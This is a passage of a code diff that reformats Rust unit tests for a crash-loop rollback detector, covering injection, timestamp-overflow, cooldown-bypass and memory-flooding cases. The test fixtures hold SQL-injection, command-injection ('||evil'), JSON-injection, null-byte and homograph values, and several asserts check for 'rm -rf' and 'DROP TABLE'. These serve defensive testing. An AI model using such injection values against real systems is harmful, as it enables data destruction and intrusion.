                     }
 
                     // Test crash count accuracy despite injection
-                    let crash_count = detector.crashes_in_window_for(&malicious_event.connector_id, 1100 + attack_idx as u64);
-                    assert!(crash_count <= 1,
-                        "Attack {}: Crash count should be accurate despite injection", attack_idx);
+                    let crash_count = detector.crashes_in_window_for(
+                        &malicious_event.connector_id,
+                        1100 + attack_idx as u64,
+                    );
+                    assert!(
+                        crash_count <= 1,
+                        "Attack {}: Crash count should be accurate despite injection",
+                        attack_idx
+                    );
 
                     // Test that injection doesn't affect other connectors
                     let legitimate_connector = "legitimate_connector";
-                    let legit_count = detector.crashes_in_window_for(legitimate_connector, 1100 + attack_idx as u64);
-                    assert_eq!(legit_count, 0,
-                        "Attack {}: Injection should not affect other connectors", attack_idx);
-                },
+                    let legit_count = detector
+                        .crashes_in_window_for(legitimate_connector, 1100 + attack_idx as u64);
+                    assert_eq!(
+                        legit_count, 0,
+                        "Attack {}: Injection should not affect other connectors",
+                        attack_idx
+                    );
+                }
                 Err(_) => {
                     // Panic during injection - handled by catch_unwind
                     println!("Attack {} caused panic (safely caught)", attack_idx);
@@ -2548,32 +2795,58 @@ mod tests {
                 trusted: true,
             };
 
-            let eval_result = detector.evaluate_rollback(&malicious_event.connector_id, &pin, 1200 + attack_idx as u64, format!("eval_trace_{}", attack_idx));
+            let eval_result = detector.evaluate_rollback(
+                &malicious_event.connector_id,
+                &pin,
+                1200 + attack_idx as u64,
+                format!("eval_trace_{}", attack_idx),
+            );
 
             match eval_result {
                 Ok(decision) => {
                     // Verify decision integrity despite injection
-                    assert!(!decision.connector_id.contains('\0'),
-                        "Attack {}: Decision connector ID should be sanitized", attack_idx);
-                    assert!(!decision.reason.contains('\0'),
-                        "Attack {}: Decision reason should be sanitized", attack_idx);
-                    assert!(!decision.trace_id.contains('\0'),
-                        "Attack {}: Decision trace ID should be sanitized", attack_idx);
+                    assert!(
+                        !decision.connector_id.contains('\0'),
+                        "Attack {}: Decision connector ID should be sanitized",
+                        attack_idx
+                    );
+                    assert!(
+                        !decision.reason.contains('\0'),
+                        "Attack {}: Decision reason should be sanitized",
+                        attack_idx
+                    );
+                    assert!(
+                        !decision.trace_id.contains('\0'),
+                        "Attack {}: Decision trace ID should be sanitized",
+                        attack_idx
+                    );
 
                     // Test serialization safety
                     let decision_debug = format!("{:?}", decision);
-                    assert!(!decision_debug.contains('\0'),
-                        "Attack {}: Decision debug output should be safe", attack_idx);
-                    assert!(!decision_debug.contains("rm -rf"),
-                        "Attack {}: Decision debug should not contain command injection", attack_idx);
-                },
+                    assert!(
+                        !decision_debug.contains('\0'),
+                        "Attack {}: Decision debug output should be safe",
+                        attack_idx
+                    );
+                    assert!(
+                        !decision_debug.contains("rm -rf"),
+                        "Attack {}: Decision debug should not contain command injection",
+                        attack_idx
+                    );
+                }
                 Err(e) => {
                     // Error handling should be safe
                     let error_debug = format!("{:?}", e);
-                    assert!(!error_debug.contains('\0'),
-                        "Attack {}: Error debug should not contain null bytes", attack_idx);
-                    assert!(!error_debug.contains("rm -rf"),
-                        "Attack {}: Error debug should not contain command injection", attack_idx);
+                    assert!(
+                        !error_debug.contains('\0'),
+                        "Attack {}: Error debug should not contain null bytes",
+                        attack_idx
+                    );
+                    assert!(
+                        !error_debug.contains("rm -rf"),
+                        "Attack {}: Error debug should not contain command injection",
+                        attack_idx
+                    );
                 }
             }
         }
@@ -2587,9 +2860,15 @@ mod tests {
 
         detector.record_crash(recovery_event, 2000, "recovery_trace".to_string());
         let recovery_count = detector.crashes_in_window_for("recovery_connector", 2000);
-        assert_eq!(recovery_count, 1, "System should recover correctly after injection attacks");
+        assert_eq!(
+            recovery_count, 1,
+            "System should recover correctly after injection attacks"
+        );
 
-        println!("Crash injection attack test completed: {} attack vectors tested", malicious_crash_events.len());
+        println!(
+            "Crash injection attack test completed: {} attack vectors tested",
+            malicious_crash_events.len()
+        );
     }
 
     #[test]
@@ -2622,7 +2901,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // Path traversal in version
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2630,7 +2908,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // Null byte injection in pin hash
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2638,7 +2915,6 @@ mod tests {
                 pin_hash: "hash\x00malicious_suffix".to_string(),
                 trusted: true,
             },
-
             // Unicode bidirectional override in version
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2646,7 +2922,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // SQL injection in pin hash
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2654,7 +2929,6 @@ mod tests {
                 pin_hash: "hash'; DROP TABLE pins; --".to_string(),
                 trusted: true,
             },
-
             // JSON injection in connector ID
             KnownGoodPin {
                 connector_id: format!("{}\",\"injected\":\"evil", target_connector),
@@ -2662,7 +2936,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // Control character flood in version
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2670,7 +2943,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // ANSI escape sequence injection
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2678,7 +2950,6 @@ mod tests {
                 pin_hash: "legitimate_hash".to_string(),
                 trusted: true,
             },
-
             // Buffer overflow simulation
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2686,7 +2957,6 @@ mod tests {
                 pin_hash: "D".repeat(100000),
                 trusted: true,
             },
-
             // Trust manipulation with malicious data
             KnownGoodPin {
                 connector_id: target_connector.to_string(),
@@ -2694,7 +2964,6 @@ mod tests {
                 pin_hash: "evil_hash".to_string(),
                 trusted: false, // Explicitly untrusted but with malicious data
             },
-
             // Cross-connector confusion attack
             KnownGoodPin {
                 connector_id: "different_connector".to_string(), // Wrong connector
@@ -2705,7 +2974,10 @@ mod tests {
         ];
 
         for (pin_idx, corrupted_pin) in corrupted_pins.iter().enumerate() {
-            println!("Testing pin corruption attack {}: {}", pin_idx, corrupted_pin.version);
+            println!(
+                "Testing pin corruption attack {}: {}",
+                pin_idx, corrupted_pin.version
+            );
 
             // Attempt rollback evaluation with corrupted pin
             let corruption_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
@@ -2726,68 +2998,113 @@ mod tests {
                                 // Rollback triggered - verify pin validation
                                 if let Some(ref target) = decision.rollback_target {
                                     // Verify target pin sanitization
-                                    assert!(!target.version.contains('\0'),
-                                        "Pin {}: Target version should not contain null bytes", pin_idx);
-                                    assert!(!target.version.contains("rm -rf"),
-                                        "Pin {}: Target version should not contain command injection", pin_idx);
-                                    assert!(!target.version.contains("DROP TABLE"),
-                                        "Pin {}: Target version should not contain SQL injection", pin_idx);
+                                    assert!(
+                                        !target.version.contains('\0'),
+                                        "Pin {}: Target version should not contain null bytes",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        !target.version.contains("rm -rf"),
+                                        "Pin {}: Target version should not contain command injection",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        !target.version.contains("DROP TABLE"),
+                                        "Pin {}: Target version should not contain SQL injection",
+                                        pin_idx
+                                    );
 
-                                    assert!(!target.pin_hash.contains('\0'),
-                                        "Pin {}: Target hash should not contain null bytes", pin_idx);
-                                    assert!(!target.pin_hash.contains("';"),
-                                        "Pin {}: Target hash should not contain SQL injection", pin_idx);
+                                    assert!(
+                                        !target.pin_hash.contains('\0'),
+                                        "Pin {}: Target hash should not contain null bytes",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        !target.pin_hash.contains("';"),
+                                        "Pin {}: Target hash should not contain SQL injection",
+                                        pin_idx
+                                    );
 
-                                    assert!(!target.connector_id.contains('\0'),
-                                        "Pin {}: Target connector ID should not contain null bytes", pin_idx);
-                                    assert!(!target.connector_id.contains("\"injected\":"),
-                                        "Pin {}: Target connector ID should not contain JSON injection", pin_idx);
+                                    assert!(
+                                        !target.connector_id.contains('\0'),
+                                        "Pin {}: Target connector ID should not contain null bytes",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        !target.connector_id.contains("\"injected\":"),
+                                        "Pin {}: Target connector ID should not contain JSON injection",
+                                        pin_idx
+                                    );
 
                                     // Verify length limits
-                                    assert!(target.version.len() <= 10000,
-                                        "Pin {}: Target version should have reasonable length", pin_idx);
-                                    assert!(target.pin_hash.len() <= 10000,
-                                        "Pin {}: Target hash should have reasonable length", pin_idx);
+                                    assert!(
+                                        target.version.len() <= 10000,
+                                        "Pin {}: Target version should have reasonable length",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        target.pin_hash.len() <= 10000,
+                                        "Pin {}: Target hash should have reasonable length",
+                                        pin_idx
+                                    );
                                 }
 
                                 // Verify rollback decision integrity
-                                assert_eq!(decision.rollback_allowed, corrupted_pin.trusted,
-                                    "Pin {}: Rollback allowed should match pin trust status", pin_idx);
+                                assert_eq!(
+                                    decision.rollback_allowed, corrupted_pin.trusted,
+                                    "Pin {}: Rollback allowed should match pin trust status",
+                                    pin_idx
+                                );
 
                                 // Cross-connector validation
                                 if corrupted_pin.connector_id != target_connector {
-                                    assert!(!decision.triggered || !decision.rollback_allowed,
-                                        "Pin {}: Cross-connector rollback should be rejected", pin_idx);
+                                    assert!(
+                                        !decision.triggered || !decision.rollback_allowed,
+                                        "Pin {}: Cross-connector rollback should be rejected",
+                                        pin_idx
+                                    );
                                 }
                             }
 
                             // Verify decision sanitization
-                            assert!(!decision.reason.contains('\0'),
-                                "Pin {}: Decision reason should not contain null bytes", pin_idx);
-                            assert!(!decision.trace_id.contains('\0'),
-                                "Pin {}: Decision trace ID should not contain null bytes", pin_idx);
-                        },
+                            assert!(
+                                !decision.reason.contains('\0'),
+                                "Pin {}: Decision reason should not contain null bytes",
+                                pin_idx
+                            );
+                            assert!(
+                                !decision.trace_id.contains('\0'),
+                                "Pin {}: Decision trace ID should not contain null bytes",
+                                pin_idx
+                            );
+                        }
                         Err(e) => {
                             // Expected behavior for many corruption attempts
                             match e {
                                 CrashLoopError::PinUntrusted { .. } => {
                                     // Expected for untrusted pins
-                                },
+                                }
                                 CrashLoopError::PinConnectorMismatch { .. } => {
                                     // Expected for wrong connector
-                                },
+                                }
                                 _ => {
                                     // Other errors should be meaningful
                                     let error_msg = format!("{:?}", e);
-                                    assert!(!error_msg.contains('\0'),
-                                        "Pin {}: Error should not contain null bytes", pin_idx);
-                                    assert!(!error_msg.contains("rm -rf"),
-                                        "Pin {}: Error should not contain command injection", pin_idx);
+                                    assert!(
+                                        !error_msg.contains('\0'),
+                                        "Pin {}: Error should not contain null bytes",
+                                        pin_idx
+                                    );
+                                    assert!(
+                                        !error_msg.contains("rm -rf"),
+                                        "Pin {}: Error should not contain command injection",
+                                        pin_idx
+                                    );
                                 }
                             }
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Panic during corruption handling - caught by catch_unwind
                     println!("Pin corruption {} caused panic (safely caught)", pin_idx);
@@ -2800,8 +3117,11 @@ mod tests {
             // Incidents should be recorded safely regardless of pin corruption
             // (The incident was already recorded during evaluate_rollback)
             let incident_count_after = detector.incidents.len();
-            assert!(incident_count_after >= incident_count_before,
-                "Pin {}: Incidents should be recorded despite corruption", pin_idx);
+            assert!(
+                incident_count_after >= incident_count_before,
+                "Pin {}: Incidents should be recorded despite corruption",
+                pin_idx
+            );
         }
 
         // Test system integrity after corruption attacks
@@ -2819,17 +3139,26 @@ mod tests {
             "recovery_after_corruption".to_string(),
         );
 
-        assert!(recovery_result.is_ok(),
-            "System should recover correctly after pin corruption attacks");
+        assert!(
+            recovery_result.is_ok(),
+            "System should recover correctly after pin corruption attacks"
+        );
 
         if let Ok(recovery_decision) = recovery_result {
-            assert!(recovery_decision.triggered,
-                "Clean pin should trigger rollback after sufficient crashes");
-            assert!(recovery_decision.rollback_allowed,
-                "Clean pin should allow rollback");
+            assert!(
+                recovery_decision.triggered,
+                "Clean pin should trigger rollback after sufficient crashes"
+            );
+            assert!(
+                recovery_decision.rollback_allowed,
+                "Clean pin should allow rollback"
+            );
         }
 
-        println!("Pin corruption attack test completed: {} corrupted pins tested", corrupted_pins.len());
+        println!(
+            "Pin corruption attack test completed: {} corrupted pins tested",
+            corrupted_pins.len()
+        );
     }
 
     #[test]
@@ -2843,32 +3172,32 @@ mod tests {
         // Malicious timestamp manipulation patterns
         let malicious_timestamps = [
             // Extreme future timestamps
-            u64::MAX,                    // Maximum possible timestamp
-            u64::MAX - 1,               // Near maximum
-            18446744073709551615u64,    // 2^64 - 1 explicitly
-            9223372036854775807u64,     // i64::MAX (signed max)
-
+            u64::MAX,                // Maximum possible timestamp
+            u64::MAX - 1,            // Near maximum
+            18446744073709551615u64, // 2^64 - 1 explicitly
+            9223372036854775807u64,  // i64::MAX (signed max)
             // Extreme past timestamps
-            0,                          // Unix epoch
-            1,                          // Minimal positive
-            86400,                      // One day after epoch
-
+            0,     // Unix epoch
+            1,     // Minimal positive
+            86400, // One day after epoch
             // Overflow attempt values
-            18446744073709551000u64,    // Near overflow boundary
-            u64::MAX - 300,             // Just under max with window consideration
-            u64::MAX / 2,               // Half of maximum range
-
+            18446744073709551000u64, // Near overflow boundary
+            u64::MAX - 300,          // Just under max with window consideration
+            u64::MAX / 2,            // Half of maximum range
             // Arithmetic edge cases
-            300,                        // Equal to typical window size
-            299,                        // Just under window
-            301,                        // Just over window
-            600,                        // Double window
-            4294967295u64,              // u32::MAX
-            4294967296u64,              // u32::MAX + 1
+            300,           // Equal to typical window size
+            299,           // Just under window
+            301,           // Just over window
+            600,           // Double window
+            4294967295u64, // u32::MAX
+            4294967296u64, // u32::MAX + 1
         ];
 
         for (ts_idx, malicious_timestamp) in malicious_timestamps.iter().enumerate() {
-            println!("Testing timestamp manipulation {}: timestamp {}", ts_idx, malicious_timestamp);
+            println!(
+                "Testing timestamp manipulation {}: timestamp {}",
+                ts_idx, malicious_timestamp
+            );
 
             // Create crash event with malicious timestamp
             let timestamp_attack_event = CrashEvent {
@@ -2889,28 +3218,41 @@ mod tests {
             match record_result {
                 Ok(()) => {
                     // Test crash count with timestamp manipulation
-                    let crash_count = detector.crashes_in_window_for(target_connector, *malicious_timestamp);
+                    let crash_count =
+                        detector.crashes_in_window_for(target_connector, *malicious_timestamp);
 
                     // Verify crash counting handles extreme timestamps safely
-                    assert!(crash_count <= 100,
-                        "Timestamp attack {}: Crash count should be bounded: {}", ts_idx, crash_count);
+                    assert!(
+                        crash_count <= 100,
+                        "Timestamp attack {}: Crash count should be bounded: {}",
+                        ts_idx,
+                        crash_count
+                    );
 
                     // Test window calculation safety
                     let window_start = malicious_timestamp.saturating_sub(300); // Safe subtraction
-                    let crashes_alt = detector.crashes_in_window_for(target_connector, *malicious_timestamp);
+                    let crashes_alt =
+                        detector.crashes_in_window_for(target_connector, *malicious_timestamp);
 
                     // Verify consistent counting
-                    assert_eq!(crash_count, crashes_alt,
-                        "Timestamp attack {}: Window calculation should be consistent", ts_idx);
+                    assert_eq!(
+                        crash_count, crashes_alt,
+                        "Timestamp attack {}: Window calculation should be consistent",
+                        ts_idx
+                    );
 
                     // Test overflow in arithmetic operations
                     let future_timestamp = malicious_timestamp.saturating_add(1000);
-                    let future_count = detector.crashes_in_window_for(target_connector, future_timestamp);
+                    let future_count =
+                        detector.crashes_in_window_for(target_connector, future_timestamp);
 
                     // Should handle arithmetic overflow gracefully
-                    assert!(future_count <= crash_count.saturating_add(1),
-                        "Timestamp attack {}: Future count should be reasonable", ts_idx);
-                },
+                    assert!(
+                        future_count <= crash_count.saturating_add(1),
+                        "Timestamp attack {}: Future count should be reasonable",
+                        ts_idx
+                    );
+                }
                 Err(_) => {
                     println!("Timestamp attack {} caused panic (safely caught)", ts_idx);
                 }
@@ -2924,8 +3266,11 @@ mod tests {
             match cooldown_result {
                 Ok(in_cooldown) => {
                     // Cooldown calculation should complete without error
-                    println!("Timestamp attack {}: cooldown status = {}", ts_idx, in_cooldown);
-                },
+                    println!(
+                        "Timestamp attack {}: cooldown status = {}",
+                        ts_idx, in_cooldown
+                    );
+                }
                 Err(_) => {
                     println!("Timestamp attack {} cooldown check caused panic", ts_idx);
                 }
@@ -2953,23 +3298,35 @@ mod tests {
                     match result {
                         Ok(decision) => {
                             // Verify decision timestamps are handled safely
-                            assert!(!decision.timestamp.is_empty(),
-                                "Timestamp attack {}: Decision should have timestamp", ts_idx);
-                            assert!(decision.window_secs > 0,
-                                "Timestamp attack {}: Window should be positive", ts_idx);
+                            assert!(
+                                !decision.timestamp.is_empty(),
+                                "Timestamp attack {}: Decision should have timestamp",
+                                ts_idx
+                            );
+                            assert!(
+                                decision.window_secs > 0,
+                                "Timestamp attack {}: Window should be positive",
+                                ts_idx
+                            );
 
                             // Verify no overflow in crash count
-                            assert!(decision.crash_count <= 10000,
-                                "Timestamp attack {}: Crash count should be reasonable", ts_idx);
-                        },
+                            assert!(
+                                decision.crash_count <= 10000,
+                                "Timestamp attack {}: Crash count should be reasonable",
+                                ts_idx
+                            );
+                        }
                         Err(e) => {
                             // Error handling should be safe
                             let error_str = format!("{:?}", e);
-                            assert!(error_str.len() > 0,
-                                "Timestamp attack {}: Error should be meaningful", ts_idx);
+                            assert!(
+                                error_str.len() > 0,
+                                "Timestamp attack {}: Error should be meaningful",
+                                ts_idx
+                            );
                         }
                     }
-                },
+                }
                 Err(_) => {
                     println!("Timestamp attack {} evaluation caused panic", ts_idx);
                 }
@@ -2992,13 +3349,19 @@ mod tests {
 
         // Verify ordered timestamps work correctly
         let ordered_count = detector.crashes_in_window_for("ordering_test", 5000);
-        assert!(ordered_count > 0, "Ordered timestamps should register crashes");
-        assert!(ordered_count <= 5, "Ordered timestamps should not exceed actual crash count");
+        assert!(
+            ordered_count > 0,
+            "Ordered timestamps should register crashes"
+        );
+        assert!(
+            ordered_count <= 5,
+            "Ordered timestamps should not exceed actual crash count"
+        );
 
         // Test concurrent timestamp attacks
         let concurrent_timestamps = [
             10000u64, 10000, 10000, 10000, 10000, // Same timestamp
-            10001, 10001, 10002, 10002, 10003,   // Close timestamps
+            10001, 10001, 10002, 10002, 10003, // Close timestamps
         ];
 
         for (conc_idx, &ts) in concurrent_timestamps.iter().enumerate() {
@@ -3014,11 +3377,19 @@ mod tests {
         }
 
         let concurrent_count = detector.crashes_in_window_for("concurrent_test", 10010);
-        assert!(concurrent_count > 0, "Concurrent timestamps should register");
-        assert!(concurrent_count <= 10, "Concurrent count should be reasonable");
+        assert!(
+            concurrent_count > 0,
+            "Concurrent timestamps should register"
+        );
+        assert!(
+            concurrent_count <= 10,
+            "Concurrent count should be reasonable"
+        );
 
-        println!("Timestamp manipulation attack test completed: {} malicious timestamps + ordering + concurrency tested",
-            malicious_timestamps.len());
+        println!(
+            "Timestamp manipulation attack test completed: {} malicious timestamps + ordering + concurrency tested",
+            malicious_timestamps.len()
+        );
     }
 
     #[test]
@@ -3074,27 +3445,25 @@ mod tests {
             ("cooldown_bypass_target\t", "Tab character bypass"),
             ("cooldown_bypass_target\n", "Newline bypass"),
             ("cooldown_bypass_target\r", "Carriage return bypass"),
-
             // Unicode variations
             ("cooldown_bypass_target\u{200B}", "Zero-width space bypass"),
             ("cooldown_bypass_target\u{FEFF}", "BOM bypass"),
-            ("cooldown_bypass_target\u{034F}", "Combining character bypass"),
-
+            (
+                "cooldown_bypass_target\u{034F}",
+                "Combining character bypass",
+            ),
             // Case variations
             ("Cooldown_Bypass_Target", "Case variation bypass"),
             ("COOLDOWN_BYPASS_TARGET", "Uppercase bypass"),
             ("cooldown_Bypass_Target", "Mixed case bypass"),
-
             // Character substitution
             ("cooldown_bypass_targe7", "Character substitution bypass"),
             ("cooldown_bypas5_target", "Middle character substitution"),
             ("c00ld0wn_bypass_target", "Multiple substitution bypass"),
-
             // Homograph attacks
             ("сooldown_bypass_target", "Cyrillic 'c' bypass"),
             ("cooldown_bуpass_target", "Cyrillic 'y' bypass"),
             ("cooldown_bypass_tаrget", "Cyrillic 'a' bypass"),
-
             // Injection attempts
             ("cooldown_bypass_target'; --", "SQL injection bypass"),
             ("cooldown_bypass_target||evil", "Command injection bypass"),
@@ -3103,8 +3472,13 @@ mod tests {
 
         let base_timestamp = 1100; // During cooldown period
 
-        for (attack_idx, (bypass_connector_id, attack_description)) in bypass_attacks.iter().enumerate() {
-            println!("Testing cooldown bypass attack {}: {}", attack_idx, attack_description);
+        for (attack_idx, (bypass_connector_id, attack_description)) in
+            bypass_attacks.iter().enumerate()
+        {
+            println!(
+                "Testing cooldown bypass attack {}: {}",
+                attack_idx, attack_description
+            );
 
             // Attempt to record crashes with bypass connector ID
             for i in 0..6 {
@@ -3143,23 +3517,34 @@ mod tests {
                         // Check if this is a legitimate bypass due to different connector
                         if bypass_connector_id != &bypass_connector {
                             // Different connector should be allowed
-                            assert!(!detector.in_cooldown_for(bypass_connector_id, bypass_timestamp),
-                                "Attack {}: Different connector should not be in cooldown", attack_idx);
+                            assert!(
+                                !detector.in_cooldown_for(bypass_connector_id, bypass_timestamp),
+                                "Attack {}: Different connector should not be in cooldown",
+                                attack_idx
+                            );
                         } else {
                             // Same connector during cooldown should be blocked
                             if detector.in_cooldown_for(bypass_connector, bypass_timestamp) {
-                                panic!("SECURITY VIOLATION: Cooldown bypass succeeded for attack {}: {}",
-                                    attack_idx, attack_description);
+                                panic!(
+                                    "SECURITY VIOLATION: Cooldown bypass succeeded for attack {}: {}",
+                                    attack_idx, attack_description
+                                );
                             }
                         }
                     }
 
                     // Verify decision integrity
-                    assert!(!decision.connector_id.is_empty(),
-                        "Attack {}: Decision should have valid connector ID", attack_idx);
-                    assert!(!decision.trace_id.is_empty(),
-                        "Attack {}: Decision should have valid trace ID", attack_idx);
-                },
+                    assert!(
+                        !decision.connector_id.is_empty(),
+                        "Attack {}: Decision should have valid connector ID",
+                        attack_idx
+                    );
+                    assert!(
+                        !decision.trace_id.is_empty(),
+                        "Attack {}: Decision should have valid trace ID",
+                        attack_idx
+                    );
+                }
                 Err(e) => {
                     // Expected behavior during cooldown
                     match e {
@@ -3167,36 +3552,50 @@ mod tests {
                             // Verify cooldown error is for correct connector
                             if let CrashLoopError::CooldownActive { connector_id, .. } = e {
                                 // Should reference the actual connector being tested
-                                assert!(!connector_id.is_empty(),
-                                    "Attack {}: Cooldown error should have valid connector ID", attack_idx);
+                                assert!(
+                                    !connector_id.is_empty(),
+                                    "Attack {}: Cooldown error should have valid connector ID",
+                                    attack_idx
+                                );
                             }
-                        },
+                        }
                         _ => {
                             // Other errors may be valid depending on bypass type
                             let error_msg = format!("{:?}", e);
-                            assert!(!error_msg.is_empty(),
-                                "Attack {}: Error should be meaningful", attack_idx);
+                            assert!(
+                                !error_msg.is_empty(),
+                                "Attack {}: Error should be meaningful",
+                                attack_idx
+                            );
                         }
                     }
                 }
             }
 
             // Verify original connector still in cooldown
-            assert!(detector.in_cooldown_for(bypass_connector, bypass_timestamp),
-                "Attack {}: Original connector should remain in cooldown", attack_idx);
+            assert!(
+                detector.in_cooldown_for(bypass_connector, bypass_timestamp),
+                "Attack {}: Original connector should remain in cooldown",
+                attack_idx
+            );
 
             // Test incident logging for bypass attempts
             let incident_count = detector.incidents.len();
-            assert!(incident_count > attack_idx,
-                "Attack {}: Bypass attempts should generate incident logs", attack_idx);
+            assert!(
+                incident_count > attack_idx,
+                "Attack {}: Bypass attempts should generate incident logs",
+                attack_idx
+            );
         }
 
         // Test temporal cooldown bypass (waiting for cooldown to expire)
         let post_cooldown_timestamp = base_timestamp + 3700; // After default 60s cooldown + margin
 
         // Verify cooldown has expired
-        assert!(!detector.in_cooldown_for(bypass_connector, post_cooldown_timestamp),
-            "Cooldown should expire after sufficient time");
+        assert!(
+            !detector.in_cooldown_for(bypass_connector, post_cooldown_timestamp),
+            "Cooldown should expire after sufficient time"
+        );
 
         // Test legitimate rollback after cooldown expiration
         let post_cooldown_result = detector.evaluate_rollback(
@@ -3210,18 +3609,25 @@ mod tests {
             Ok(decision) => {
                 // Should be allowed after cooldown expires
                 if decision.crash_count >= 5 {
-                    assert!(decision.triggered,
-                        "Rollback should be triggered after cooldown expires with sufficient crashes");
-                    assert!(decision.rollback_allowed,
-                        "Rollback should be allowed after cooldown expires");
+                    assert!(
+                        decision.triggered,
+                        "Rollback should be triggered after cooldown expires with sufficient crashes"
+                    );
+                    assert!(
+                        decision.rollback_allowed,
+                        "Rollback should be allowed after cooldown expires"
+                    );
                 }
-            },
+            }
             Err(e) => {
                 // May fail due to insufficient crashes in current window
                 match e {
                     CrashLoopError::CooldownActive { .. } => {
-                        panic!("Cooldown should have expired by timestamp {}", post_cooldown_timestamp);
-                    },
+                        panic!(
+                            "Cooldown should have expired by timestamp {}",
+                            post_cooldown_timestamp
+                        );
+                    }
                     _ => {
                         // Other errors acceptable
                     }
@@ -3239,12 +3645,17 @@ mod tests {
             );
 
             // Rapid evaluations should be handled safely
-            assert!(rapid_result.is_ok() || rapid_result.is_err(),
-                "Rapid succession evaluation {} should complete", rapid_idx);
+            assert!(
+                rapid_result.is_ok() || rapid_result.is_err(),
+                "Rapid succession evaluation {} should complete",
+                rapid_idx
+            );
         }
 
-        println!("Cooldown bypass attack test completed: {} bypass vectors + temporal bypass + rapid succession tested",
-            bypass_attacks.len());
+        println!(
+            "Cooldown bypass attack test completed: {} bypass vectors + temporal bypass + rapid succession tested",
+            bypass_attacks.len()
+        );
     }
 
     #[test]
@@ -3258,13 +3669,10 @@ mod tests {
         let memory_attack_scenarios = [
             // High-frequency crash flooding
             ("frequency_flood", 1000, "High frequency crash flooding"),
-
             // Large payload crashes
             ("large_payload", 100, "Large crash event payload"),
-
             // Many unique connectors
             ("unique_connectors", 500, "Many unique connector flooding"),
-
             // Mixed pattern flooding
             ("mixed_pattern", 300, "Mixed pattern memory pressure"),
         ];
@@ -3282,27 +3690,32 @@ mod tests {
                         // High frequency with normal payloads
                         CrashEvent {
                             connector_id: "frequency_victim".to_string(),
-                            timestamp: format!("2024-01-01T14:{:02}:{:02}Z",
-                                (event_idx / 60) % 60, event_idx % 60),
+                            timestamp: format!(
+                                "2024-01-01T14:{:02}:{:02}Z",
+                                (event_idx / 60) % 60,
+                                event_idx % 60
+                            ),
                             reason: format!("frequency_crash_{}", event_idx),
                         }
-                    },
+                    }
                     "large_payload" => {
                         // Large crash event payloads
                         CrashEvent {
                             connector_id: format!("large_connector_{}", event_idx % 10),
                             timestamp: format!("2024-01-01T15:00:{:02}Z", event_idx % 60),
-                            reason: format!("large_crash_{}_{}_{}",
+                            reason: format!(
+                                "large_crash_{}_{}_{}",
                                 event_idx,
-                                "A".repeat(1000),  // Large reason field
+                                "A".repeat(1000), // Large reason field
                                 "B".repeat(500)   // Additional payload
                             ),
                         }
-                    },
+                    }
                     "unique_connectors" => {
                         // Many unique connectors
                         CrashEvent {
-                            connector_id: format!("unique_connector_{}_{}_{}",
+                            connector_id: format!(
+                                "unique_connector_{}_{}_{}",
                                 event_idx,
                                 "connector".repeat(10),
                                 event_idx * 17 % 1000
@@ -3310,23 +3723,28 @@ mod tests {
                             timestamp: format!("2024-01-01T16:00:{:02}Z", event_idx % 60),
                             reason: format!("unique_crash_{}", event_idx),
                         }
-                    },
+                    }
                     "mixed_pattern" => {
                         // Mixed patterns for complex memory pressure
                         CrashEvent {
-                            connector_id: format!("mixed_{}_{}",
+                            connector_id: format!(
+                                "mixed_{}_{}",
                                 event_idx % 3,
                                 if event_idx % 2 == 0 { "even" } else { "odd" }
                             ),
-                            timestamp: format!("2024-01-01T17:{:02}:{:02}Z",
-                                (event_idx / 60) % 60, event_idx % 60),
-                            reason: format!("mixed_crash_{}_{}_{}",
+                            timestamp: format!(
+                                "2024-01-01T17:{:02}:{:02}Z",
+                                (event_idx / 60) % 60,
+                                event_idx % 60
+                            ),
+                            reason: format!(
+                                "mixed_crash_{}_{}_{}",
                                 event_idx,
                                 "pattern".repeat(event_idx % 5 + 1),
                                 "X".repeat(event_idx % 100)
                             ),
                         }
-                    },
+                    }
                     _ => unreachable!(),
                 };
 
@@ -3342,9 +3760,12 @@ mod tests {
                 match record_result {
                     Ok(()) => {
                         // Successful recording
-                    },
+                    }
                     Err(_) => {
-                        println!("Memory attack {} event {} caused panic (caught)", scenario_name, event_idx);
+                        println!(
+                            "Memory attack {} event {} caused panic (caught)",
+                            scenario_name, event_idx
+                        );
                         break; // Stop flooding on panic
                     }
                 }
@@ -3354,15 +3775,21 @@ mod tests {
                     let elapsed = start_time.elapsed();
 
                     // Should not take excessive time per batch
-                    assert!(elapsed < Duration::from_secs(10),
+                    assert!(
+                        elapsed < Duration::from_secs(10),
                         "Memory attack {}: Recording should not take excessive time: {:?}",
-                        scenario_name, elapsed);
+                        scenario_name,
+                        elapsed
+                    );
 
                     // Check incident count growth
                     let incident_count = detector.incidents.len();
-                    assert!(incident_count <= event_idx + 100,
+                    assert!(
+                        incident_count <= event_idx + 100,
                         "Memory attack {}: Incident count should be bounded: {}",
-                        scenario_name, incident_count);
+                        scenario_name,
+                        incident_count
+                    );
 
                     // Sample crash count queries (should remain performant)
                     let sample_count = detector.crashes_in_window_for(
@@ -3371,19 +3798,27 @@ mod tests {
                     );
 
                     // Crash count queries should complete quickly
-                    assert!(sample_count <= 1000,
+                    assert!(
+                        sample_count <= 1000,
                         "Memory attack {}: Crash count should be reasonable: {}",
-                        scenario_name, sample_count);
+                        scenario_name,
+                        sample_count
+                    );
                 }
             }
 
             let total_duration = start_time.elapsed();
-            println!("Memory attack {} completed: {} events in {:?}",
-                scenario_name, event_count, total_duration);
+            println!(
